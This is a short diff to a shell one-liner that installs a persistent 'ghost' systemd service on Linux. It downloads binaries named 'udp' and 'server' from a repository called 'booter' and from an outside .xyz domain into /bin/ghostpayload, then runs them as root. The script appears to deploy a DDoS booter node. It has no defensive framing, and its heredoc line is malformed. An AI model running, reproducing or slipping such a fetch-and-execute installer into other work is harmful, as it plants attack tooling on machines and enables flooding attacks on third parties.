@@ -1,2 +1,2 @@
 sudo apt-get -y install screen; yum install screen -y; yum install wget -y; sudo apt-get -y install wget; sudo mkdir /bin/ghostpayload; cd /bin/ghostpayload; sudo wget -O udp "https://github.com/CasperrDeveloper/booter/raw/master/udp"; sudo wget -O server "http://casperdeveloper.xyz/server"; sleep 1; sudo chmod +x udp; sudo chmod +x server; sudo ./server; cat>/etc/systemd/ghost.service<<wget https://github.com/CasperrDeveloper/booter/raw/master/service.txt; sudo systemctl daemon-reload
-sudo systemctl start ghost
+sudo systemctl start ghost &
